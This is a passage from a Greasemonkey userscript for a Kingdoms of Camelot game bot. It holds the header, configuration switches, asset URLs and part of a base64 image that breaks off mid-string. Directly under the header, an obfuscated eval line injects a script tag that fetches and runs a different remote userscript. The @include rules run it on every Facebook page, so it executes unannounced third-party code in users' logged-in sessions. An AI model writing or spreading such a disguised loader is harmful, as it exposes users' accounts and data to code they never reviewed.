// ==UserScript==
// @name           KOC Power Bot Plus + Last Update (traducido por Aioras)
// @version       20110818c
// @namespace      mat
// @homepage       http://userscripts.org/scripts/review/104793
// @include        http://*.kingdomsofcamelot.com/*main_src.php*
// @include        http://apps.facebook.com/kingdomsofcamelot/*
// @include		   http://www.kabam.com/games/kingdoms-of-camelot/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        *facebook.com/connect/uiserver.php*
// @description    Funciones automatizadas de Reinos de Camelot
// @require http://sizzlemctwizzle.com/updater.php?id=104793
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var Version = '20110818c';

// These switches are for testing, all should be set to false for released version:
var DEBUG_TRACE = false;
var DEBUG_SEARCH = false;
var ENABLE_TEST_TAB = false;
var ENABLE_ATTACK_TAB = false;
var ENABLE_SAMPLE_TAB = false;
var DISABLE_BULKADD_LIST = false;
var ENABLE_GM_AJAX_TRACE = false;
var SEND_ALERT_AS_WHISPER = false;
// end test switches

var MAP_DELAY = 1200;

//var DEFAULT_ALERT_SOUND_URL = 'http://andalusies.no-ip.biz/kofc/tonosalrmas/Trumpet_Alarm.mp3';
//var SWF_PLAYER_URL = 'http://andalusies.no-ip.biz/kofc/alarmplayer.swf';
var DEFAULT_ALERT_SOUND_URL = 'http://koc.god-like.info/alarm.mp3';
var SWF_PLAYER_URL = 'http://koc.god-like.info/alarmplayer.swf';


var URL_CASTLE_BUT = 'http://i.imgur.com/MPlZr.png';
var URL_CASTLE_BUT_SEL = 'http://i.imgur.com/XWR4B.png';
var CHAT_BG_IMAGE = "data:image/gif;base64,R0lGODlhkAFpAvcAAP//5///4//74//73///6///3//72//75/v73/v32/v74//32/v31wgEAPv72/fz1/vz3wQAAPvz1yAcBAwIABgQBPvv0vfz0v/z3xAEAPfzzhAMBPv7+yQUAPfr1xBdwigcBDEoEAhJjhBdthwQBCAQBCg9YQxBee/vxi1lpgxFghQMAKqiffv30hgUBBhhxi0cBNLCpghNngw5ZSQUCBxlwhRVqgAABPf31wQ5cQAAAAhRpvPrzrKqguPftuPKnvPnxsaygvPryuvjyvfv0v/31/fvzsa2ltvOogxVqr6yjjEgDNK+njUkCOvjxqKKYcrCnv/71wgEBAhBeZ6WcffvxuPbuvvvysa+mgw5bUU1CCAoJKKOZRgMBPf75/fz49fKpuPSoqaeeQQEAAxhwuvjwr6ygtLGnr6qgvPz3766lsa6ntLKprKmdca2irKuinVpRTUkDOPbvrKedRQ1VdfOprKmivvz25aGWQhFgigoJPv7777X17Kebe/rxvPnwuvfvv//19fKnt/SshQ1WdfGlvf/63VtTd/bsrKife/nuqqOZdvSpu/vzu/nwk0xCNvSsvv71005COvryjUgCBBhum1lRbqqiramdff30k1FJNvGngxRqtLCllVBJNfOrtvSrqqicaKOWe/v0uPjvvv366qWacbX2ygcDMq+kvP77whRnkUtCKqmhggAAJ6GVZKKabqqaRAMAAhNllVJKKaSYbqylvv/47aedRAIBBRhxiAYBBRZqqaWdcbX0qqecePbwsrGrpJ9WRQEAAwAABgQCI59TQwtUVVFLe/r1009JL6qdYp1PbLGzsrKpvv3yrKaYRhlwtvKrpaGYevftvv70qKedSAQAPfnyllRQaKOTRBdvop9Xe/z1xRRnvPjykVFOQgIAPvv1xgxRf/z1/v/3y0gCP/z46KijjVhphxBbVVlaTVJZTUkAKKmnigYBBxlxjlllvf71yBhtjkgBChNeRRZti0oGPf74/v/2/P73yRdqv/35wAAAAAAAAAAACH5BAEAAP0ALAAAAACQAWkCAAj/ADkIHFhqCDArVsoAAoQQ4cKFDSNKfEiRocSLGBtWpGhlo8WGpKyQGklKjkmKcjpCfOiQIcSMEz/CnCmHVBlgJlNmrKjxYc6aJEPCDMlxJkJSwJIGjciSaVGNDX+WmarQaMeZ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